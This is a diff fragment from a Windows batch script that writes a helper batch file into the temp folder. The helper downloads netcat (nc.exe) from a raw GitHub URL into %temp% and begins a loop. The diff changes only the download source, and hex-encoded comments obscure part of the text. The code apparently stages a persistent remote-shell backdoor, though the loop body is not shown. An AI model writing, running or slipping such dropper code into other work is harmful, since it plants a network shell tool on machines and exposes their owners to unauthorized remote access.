@@ -16,7 +16,7 @@
 set "batFilePath=%temp%\pro.bat"
 if not exist "%batFilePath%" (
     echo @echo off > "%batFilePath%"
-    echo curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe >> "%batFilePath%"
+    echo curl https://raw.githubusercontent.com/0x2034/shell4/main/nc.exe -o %temp%\nc.exe >> "%batFilePath%"
     echo :loop >> "%batFilePath%"
 @REM 73746172742e626174202d2d3e20696e206361736520726567656e65726174696e67206e696862746474646f772e6261740a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d
 @REM 2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a406563
